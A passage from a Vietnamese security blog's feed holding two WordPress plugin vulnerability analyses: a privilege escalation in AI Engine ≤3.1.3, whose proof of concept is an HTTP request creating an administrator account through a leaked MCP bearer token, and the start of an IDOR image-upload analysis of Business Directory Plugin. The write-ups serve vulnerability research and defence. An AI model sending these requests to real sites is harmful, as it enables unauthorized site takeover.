&amp;#39;message&amp;#39; =&amp;gt; $uid-&amp;gt;get_error_message() ];&#xA;        }&#xA;        else {&#xA;          $this-&amp;gt;add_result_text( $r, &amp;#39;User created ID &amp;#39; . $uid );&#xA;        }&#xA;        break;&#xA;    ...&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm gọi đến &lt;code&gt;wp_insert_user&lt;/code&gt; để tạo tài khoản WordPress mới với tất cả các giá trị do ta kiểm soát =&amp;gt; &lt;strong&gt;Privilege Escalation&lt;/strong&gt; xảy ra&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access /wp-json&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;REST API exposes MCP endpoints (Bearer Token leaked)&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Extract Bearer Token from response&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Send POST request to /wp-json/mcp/v1/{token}/messages&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;permission_callback → handle_noauth_access()&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Bearer Token valid&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;wp_set_current_user(admin)&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;handle_message()&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;method = tools/call&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;execute_tool()&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;mwai_mcp_callback triggered&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;dispatch()&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;wp_create_user()&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;New administrator account created&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Privilege Escalation&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Truy cập endpoint &lt;code&gt;/wp-json&lt;/code&gt; để lấy giá trị &lt;strong&gt;Bearer Token&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Gửi request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/mcp/v1/{token}/messages HTTP/1.1&#xA;Host: localhost&#xA;&#xA;{&#xA;  &amp;#34;id&amp;#34;: 1,&#xA;  &amp;#34;method&amp;#34;: &amp;#34;tools/call&amp;#34;,&#xA;  &amp;#34;params&amp;#34;: {&#xA;    &amp;#34;name&amp;#34;: &amp;#34;wp_create_user&amp;#34;,&#xA;    &amp;#34;arguments&amp;#34;: {&#xA;      &amp;#34;user_login&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;user_email&amp;#34;: &amp;#34;hacker@gmail.com&amp;#34;,&#xA;      &amp;#34;user_pass&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;display_name&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;role&amp;#34;: &amp;#34;administrator&amp;#34;&#xA;    }&#xA;  },&#xA;  &amp;#34;name&amp;#34;: &amp;#34;2&amp;#34;,&#xA;  &amp;#34;arguments&amp;#34;: &amp;#34;3&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Login với tài khoản vừa tạo&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/result.png&#39; alt=&#34;Result&#34; height=&#34;638&#34; width=&#34;1243&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng trong AI Engine (≤ 3.1.3) xuất phát từ việc &lt;strong&gt;kết hợp sai giữa cơ chế “No-Auth URL” và logic phân quyền nội bộ&lt;/strong&gt;, dẫn đến việc &lt;strong&gt;cấp quyền quản trị chỉ dựa trên một Bearer Token bị lộ công khai&lt;/strong&gt;.&#xA;Khi endpoint MCP được hiển thị trong &lt;code&gt;/wp-json&lt;/code&gt;, kẻ tấn công có thể thu thập token, gọi trực tiếp API và thực thi các hành động nhạy cảm như tạo tài khoản quản trị mới mà &lt;strong&gt;không cần xác thực&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Mặc dù quyền admin chỉ tồn tại trong vòng đời của request, nhưng chỉ cần &lt;strong&gt;một lần gọi hợp lệ&lt;/strong&gt; là đủ để tạo tài khoản quản trị vĩnh viễn, dẫn đến &lt;strong&gt;Privilege Escalation hoàn chỉnh&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá v3.1.4 chỉ ẩn endpoint khỏi REST index, giúp giảm khả năng bị dò quét, nhưng &lt;strong&gt;không giải quyết triệt để vấn đề thiết kế bảo mật cốt lõi&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không bao giờ sử dụng token trong URL như cơ chế xác thực.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Ẩn endpoint (&lt;code&gt;show_in_rest = false&lt;/code&gt;) không đồng nghĩa với bảo mật.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;&lt;code&gt;wp_set_current_user()&lt;/code&gt; không nên được dùng cho xác thực từ request bên ngoài.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Mọi API có khả năng thay đổi trạng thái hệ thống phải có xác thực mạnh (auth + authorization).&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Việc gán quyền admin trong request, dù tạm thời, vẫn đủ để gây leo thang đặc quyền.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;REST API cần được thiết kế theo nguyên tắc “deny by default”.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ai-engine/vulnerability/wordpress-ai-engine-plugin-3-1-3-unauthenticated-sensitive-information-exposure-to-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin &amp;lt;= 3.1.3 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-13887 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-31-cve-2024-13887/</link>
      <pubDate>Wed, 31 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-31-cve-2024-13887/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Business Directory Plugin – Easy Listing Directories for WordPress&lt;/strong&gt; tồn tại lỗ hổng &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; trong tất cả các phiên bản từ trước đến &lt;strong&gt;6.4.14&lt;/strong&gt;, thông qua hàm &lt;code&gt;ajax_listing_submit_image_upload&lt;/code&gt; do thiếu kiểm tra hợp lệ đối với một khóa do người dùng kiểm soát. Điều này cho phép kẻ tấn công &lt;strong&gt;chưa xác thực&lt;/strong&gt; có thể &lt;strong&gt;tải lên hình ảnh tùy ý vào các listing&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-13887&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-13887&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.4.14&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.4.15&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/business-directory-plugin/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Business Directory Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Business Directory&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;6.4.14&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;6.4.15&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đăng ký AJAX handler &lt;strong&gt;cho người dùng đã đăng nhập&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_wpbdp-listing-submit-image-upload&amp;#39;, array( &amp;amp;$this, &amp;#39;ajax_listing_submit_image_upload&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv&lt;/code&gt; là hook dành cho tất cả người dùng, kết cả chưa đăng nhập. Khi có request tới endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=wpbdp-listing-submit-image-upload&lt;/code&gt; thì callback &lt;code&gt;ajax_listing_submit_image_upload&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function ajax_listing_submit_image_upload() {&#xA;    $res = new WPBDP_AJAX_Response();&#xA;&#xA;    $listing_id = intval( $_REQUEST[&amp;#39;listing_id&amp;#39;] );&#xA;    ...&#xA;    $files  = wpbdp_flatten_files_array( isset( $_FILES[&amp;#39;images&amp;#39;] ) ? $_FILES[&amp;#39;images&amp;#39;] : array() );&#xA;    $errors = array();&#xA;&#xA;    $listing         = WPBDP_Listing::get( $listing_id );&#xA;    $slots_available = 0;&#xA;    $plan            = $listing-&amp;gt;get_fee_plan();&#xA;    if ( ! $plan ) {&#xA;        return $res-&amp;gt;send_error( __( &amp;#39;Please select a plan before uploading images to the listing&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;    }&#xA;&#xA;    $slots_available = absint( $plan-&amp;gt;fee_images ) - absint( $_POST[&amp;#39;images_count&amp;#39;] );&#xA;    if ( 0 &amp;gt;= $slots_available ) {&#xA;        return $res-&amp;gt;send_error( __( &amp;#39;Can not upload any more images for this listing.&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;    } elseif ( $slots_available &amp;lt; count( $files ) ) {&#xA;        return $res-&amp;gt;send_error(&#xA;            sprintf(&#xA;                _nx(&#xA;                    &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slot available. Please adjust your selection.&amp;#39;,&#xA;                    &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slots available. Please adjust your selection.&amp;#39;,&#xA;                    $slots_available,&#xA;                    &amp;#39;listing image upload&amp;#39;,&#xA;                    &amp;#39;business-directory-plugin&amp;#39;&#xA;                ),&#xA;                count( $files ),&#xA;                $slots_available&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    foreach ( $files as $i =&amp;gt; $file ) {&#xA;        $image_error   = &amp;#39;&amp;#39;;&#xA;        $attachment_id = wpbdp_media_upload(&#xA;            $file,&#xA;            true,&#xA;            true,&#xA;            array(&#xA;                &amp;#39;image&amp;#39;      =&amp;gt; true,&#xA;                &amp;#39;min-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-min-filesize&amp;#39; ) ) * 1024,&#xA;                &amp;#39;max-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-max-filesize&amp;#39; ) ) * 1024,&#xA;                &amp;#39;min-width&amp;#39;  =&amp;gt; wpbdp_get_option( &amp;#39;image-min-width&amp;#39; ),&#xA;                &amp;#39;min-height&amp;#39; =&amp;gt; wpbdp_get_option( &amp;#39;image-min-height&amp;#39; ),&#xA;            ),&#xA;            $image_error&#xA;        ); // TODO: handle errors.&#xA;&#xA;        if ( $image_error ) {&#xA;            $errors[ $file[&amp;#39;name&amp;#39;] ] = $image_error;&#xA;        } else {&#xA;            $attachments[] = $attachment_id;&#xA;        }&#xA;    }&#xA;&#xA;    $html = &amp;#39;&amp;#39;;&#xA;    foreach ( $attachments as $attachment_id ) {&#xA;        $html .= wpbdp_render(&#xA;            &amp;#39;submit-listing-images-single&amp;#39;,&#xA;            array(&#xA;                &amp;#39;image_id&amp;#39;   =&amp;gt; $attachment_id,&#xA;                &amp;#39;listing_id&amp;#39; =&amp;gt; $listing_id,&#xA;            ),&#xA;            false&#xA;        );&#xA;    }&#xA;&#xA;    $has_images = $listing-&amp;gt;get_images( &amp;#39;ids&amp;#39; );&#xA;    $listing-&amp;gt;set_images( $attachments, true );&#xA;&#xA;    // Maybe set thumbnail if there aren&amp;#39;t already images on this listing.&#xA;    if ( ! $has_images ) {&#xA;        $image_id = reset( $attachments );&#xA;        $listing-&amp;gt;set_thumbnail_id( $image_id );&#xA;    }&#xA;&#xA;    if ( $errors ) {&#xA;        $error_msg = &amp;#39;&amp;#39;;&#xA;&#xA;        foreach ( $errors as $fname =&amp;gt; $error ) {&#xA;            $error_msg .= sprintf( &amp;#39;&amp;amp;#149; %s: %s&amp;#39;, $fname, $error ) . &amp;#39;&amp;lt;br /&amp;gt;&amp;#39;;&#xA;        }&#xA;&#xA;        $res-&amp;gt;add( &amp;#39;uploadErrors&amp;#39;, $error_msg );&#xA;    }&#xA;&#xA;    $res-&amp;gt;add( &amp;#39;is_admin&amp;#39;, wpbdp_user_is_admin() );&#xA;    $res-&amp;gt;add( &amp;#39;slots_available&amp;#39;, $slots_available );&#xA;    $res-&amp;gt;add( &amp;#39;attachmentIds&amp;#39;, $attachments );&#xA;    $res-&amp;gt;add( &amp;#39;html&amp;#39;, $html );&#xA;    $res-&amp;gt;send();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm thực hiện lấy &lt;code&gt;listing_id&lt;/code&gt; và &lt;code&gt;images&lt;/code&gt; từ request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$listing_id = intval( $_REQUEST[&amp;#39;listing_id&amp;#39;] );&#xA;$files  = wpbdp_flatten_files_array( isset( $_FILES[&amp;#39;images&amp;#39;] ) ? $_FILES[&amp;#39;images&amp;#39;] : array() );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Kết thúc hàm nếu plan chưa được chọn:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$plan = $listing-&amp;gt;get_fee_plan();&#xA;if ( ! $plan ) {&#xA;    return $res-&amp;gt;send_error( __( &amp;#39;Please select a plan before uploading images to the listing&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/plan.png&#34; title=&#34;Chọn plan&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/plan.png&#34; data-sub-html=&#34;&lt;h2&gt;Plan&lt;/h2&gt;&lt;p&gt;Chọn plan&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/plan.png&#39; alt=&#34;Plan&#34; height=&#34;459&#34; 